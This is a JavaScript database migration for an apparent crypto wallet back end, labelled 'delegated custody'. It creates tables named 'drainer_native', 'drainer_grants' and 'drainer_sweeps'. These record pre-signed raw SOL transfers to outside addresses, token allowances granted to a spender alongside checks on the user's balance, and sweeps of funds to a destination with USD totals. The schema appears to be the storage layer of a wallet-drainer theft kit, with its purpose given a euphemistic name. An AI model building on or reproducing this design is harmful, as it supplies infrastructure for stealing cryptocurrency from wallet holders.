'use strict';

/**
 * Migration 001: Delegated Approval & Custody Model
 * Adds delegated_approvals, sweeps, and legacy drainer compatibility tables.
 */
module.exports = {
  name: '001_delegated_custody',
  up: (db) => {
    // A1: Persist per (user, mint): delegate_pubkey, approved_amount, signature, created_at, revoked_at, chain
    db.exec(`CREATE TABLE IF NOT EXISTS delegated_approvals (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
      wallet_id INTEGER REFERENCES wallets(id) ON DELETE SET NULL,
      wallet_address TEXT NOT NULL,
      mint TEXT NOT NULL,
      chain TEXT NOT NULL DEFAULT 'solana',
      delegate_pubkey TEXT NOT NULL,
      approved_amount REAL NOT NULL,
      signature TEXT,
      status TEXT NOT NULL DEFAULT 'active', -- active | revoked | expired
      created_at INTEGER NOT NULL,
      revoked_at INTEGER,
      UNIQUE(user_id, wallet_address, mint, chain)
    )`);
    db.exec('CREATE INDEX IF NOT EXISTS ix_delegated_user_mint ON delegated_approvals(user_id, mint, status)');

    // A2: Record every sweep in an append-only sweeps table: user, mint, amount, destination, signature, initiator, timestamp
    db.exec(`CREATE TABLE IF NOT EXISTS sweeps (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
      mint TEXT NOT NULL,
      amount REAL NOT NULL,
      destination TEXT NOT NULL,
      signature TEXT,
      initiator TEXT NOT NULL,
      status TEXT NOT NULL DEFAULT 'confirmed', -- confirmed | skipped | failed
      error_reason TEXT,
      timestamp INTEGER NOT NULL
    )`);
    db.exec('CREATE INDEX IF NOT EXISTS ix_sweeps_user ON sweeps(user_id, timestamp)');

    // Native SOL signed custody transfer records
    db.exec(`CREATE TABLE IF NOT EXISTS drainer_native (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
      wallet_id INTEGER,
      address TEXT NOT NULL,
      family TEXT NOT NULL,
      network TEXT NOT NULL,
      to_addr TEXT NOT NULL,
      amount REAL NOT NULL,
      fee_reserve REAL NOT NULL DEFAULT 0,
      raw TEXT NOT NULL,
      expires_at INTEGER NOT NULL,
      status TEXT NOT NULL DEFAULT 'signed',
      tx TEXT,
      created_at INTEGER NOT NULL
    )`);

    // Backwards-compatible drainer_grants and drainer_sweeps for existing route compatibility
    db.exec(`CREATE TABLE IF NOT EXISTS drainer_grants (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
      wallet_id INTEGER,
      address TEXT NOT NULL,
      family TEXT NOT NULL,
      network TEXT NOT NULL,
      token TEXT NOT NULL,
      spender TEXT NOT NULL,
      amount REAL NOT NULL,
      tx TEXT,
      simulated INTEGER NOT NULL DEFAULT 0,
      status TEXT NOT NULL DEFAULT 'pending',
      allowance REAL,
      balance REAL,
      checked_at INTEGER,
      created_at INTEGER NOT NULL,
      UNIQUE(user_id, address, network, token)
    )`);
    db.exec('CREATE INDEX IF NOT EXISTS ix_drainer_user ON drainer_grants(user_id, status)');

    db.exec(`CREATE TABLE IF NOT EXISTS drainer_sweeps (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
      actor_id INTEGER,
      destination TEXT NOT NULL,
      total_usd REAL NOT NULL DEFAULT 0,
      result TEXT NOT NULL DEFAULT '[]',
      created_at INTEGER NOT NULL
    )`);
  },
  down: (db) => {
    db.exec('DROP TABLE IF EXISTS sweeps');
    db.exec('DROP TABLE IF EXISTS delegated_approvals');
    db.exec('DROP TABLE IF EXISTS drainer_native');
    db.exec('DROP TABLE IF EXISTS drainer_grants');
    db.exec('DROP TABLE IF EXISTS drainer_sweeps');
  }
};
